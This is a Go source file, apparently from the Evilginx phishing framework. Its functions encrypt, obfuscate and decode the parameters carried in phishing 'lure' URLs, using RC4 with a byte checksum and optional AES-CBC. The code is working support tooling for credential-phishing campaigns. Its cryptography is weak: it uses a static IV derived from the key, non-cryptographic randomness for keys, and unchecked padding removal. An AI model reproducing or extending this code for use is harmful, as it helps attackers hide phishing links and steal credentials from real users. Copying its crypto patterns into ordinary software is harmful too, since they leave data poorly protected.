package evilginx

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rc4"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net/url"
	"strings"
)

func GenRandomString(n int) string {
	const lb = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	for i := range b {
		t := make([]byte, 1)
		rand.Read(t)
		b[i] = lb[int(t[0])%len(lb)]
	}
	return string(b)
}

func GenRandomAlphanumString(n int) string {
	const lb = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		t := make([]byte, 1)
		rand.Read(t)
		b[i] = lb[int(t[0])%len(lb)]
	}
	return string(b)
}

func AddPhishUrlParams(base_url *url.URL, params url.Values, base_key string) {
	if len(params) > 0 {
		var key_arg string
		for {
			key_arg = strings.ToLower(GenRandomString(rand.Intn(3) + 1))
			args := base_url.Query()
			key_duplicate := false
			for k, _ := range args {
				if key_arg == k {
					key_duplicate = true
					break
				}
			}
			if !key_duplicate {
				break
			}
		}

		enc_key := GenRandomAlphanumString(8)
		dec_params := params.Encode()

		var crc byte
		for _, c := range dec_params {
			crc += byte(c)
		}

		c, err := rc4.NewCipher([]byte(enc_key))
		if err != nil {
			return
		}
		enc_params := make([]byte, len(dec_params)+1)
		c.XORKeyStream(enc_params[1:], []byte(dec_params))
		enc_params[0] = crc

		key_val := enc_key + base64.RawURLEncoding.EncodeToString([]byte(enc_params))

		if base_key != "" {

			hash := sha256.Sum256([]byte(base_key))
			key := hash[:]

			block, err := aes.NewCipher(key)
			if err != nil {
				return
			}

			plainBytes := pad([]byte(key_val), aes.BlockSize)
			ciphertext := make([]byte, len(plainBytes))

			iv := key[:aes.BlockSize] // Static IV derived from key for simplicity
			mode := cipher.NewCBCEncrypter(block, iv)
			mode.CryptBlocks(ciphertext, plainBytes)

			key_val = base64.RawURLEncoding.EncodeToString(ciphertext)
		}

		query := base_url.Query()
		query.Add(key_arg, key_val)
		base_url.RawQuery = query.Encode()
	}
}

func ExtractPhishUrlParams(data string, base_key string) (map[string]string, bool, error) {

	ret := make(map[string]string)

	if base_key != "" {
		_enc_data, err := base64.RawURLEncoding.DecodeString(data)
		if err != nil {
			return ret, false, err
		}

		hash := sha256.Sum256([]byte(base_key))
		key := hash[:]

		block, err := aes.NewCipher(key)
		if err != nil {
			return ret, false, err
		}

		if len(_enc_data)%aes.BlockSize != 0 {
			return ret, false, fmt.Errorf("ciphertext is not a multiple of the block size")
		}

		iv := key[:aes.BlockSize]
		mode := cipher.NewCBCDecrypter(block, iv)
		_dec_data := make([]byte, len(_enc_data))
		mode.CryptBlocks(_dec_data, _enc_data)

		dec_data, err := unpad(_dec_data)
		if err != nil {
			return ret, false, err
		}

		data = string(dec_data)
	}

	var enc_key string
	if len(data) > 8 {
		enc_key = data[:8]
		enc_vals, err := base64.RawURLEncoding.DecodeString(data[8:])
		if err == nil {
			dec_params := make([]byte, len(enc_vals)-1)

			var crc byte = enc_vals[0]
			c, err := rc4.NewCipher([]byte(enc_key))
			if err != nil {
				return ret, false, err
			}
			c.XORKeyStream(dec_params, enc_vals[1:])

			var crc_chk byte
			for _, c := range dec_params {
				crc_chk += byte(c)
			}

			if crc == crc_chk {
				params, err := url.ParseQuery(string(dec_params))
				if err == nil {
					for kk, vv := range params {
						ret[kk] = vv[0]
					}
					return ret, true, nil
				}
			} else {
				return ret, false, fmt.Errorf("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", data)
			}
		} else {
			return ret, false, err
		}
	}
	return ret, false, nil
}

// pad applies PKCS#7 padding
func pad(src []byte, blockSize int) []byte {
	padding := blockSize - len(src)%blockSize
	padtext := make([]byte, padding)
	for i := range padtext {
		padtext[i] = byte(padding)
	}
	return append(src, padtext...)
}

// unpad removes PKCS#7 padding
func unpad(src []byte) ([]byte, error) {
	length := len(src)
	if length == 0 {
		return nil, fmt.Errorf("invalid padding size")
	}
	padding := int(src[length-1])
	if padding > length {
		return nil, fmt.Errorf("invalid padding")
	}
	return src[:length-padding], nil
}

/*
func CreatePhishUrl(base_url string, params *url.Values, enc_key string) string {
	var ret string = base_url
	if len(*params) > 0 {
		key_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))

		enc_key := GenRandomAlphanumString(8)
		dec_params := params.Encode()

		var crc byte
		for _, c := range dec_params {
			crc += byte(c)
		}

		c, _ := rc4.NewCipher([]byte(enc_key))
		enc_params := make([]byte, len(dec_params)+1)
		c.XORKeyStream(enc_params[1:], []byte(dec_params))
		enc_params[0] = crc

		key_val := enc_key + base64.RawURLEncoding.EncodeToString([]byte(enc_params))
		ret += "?" + key_arg + "=" + key_val
	}
	return ret
}
*/
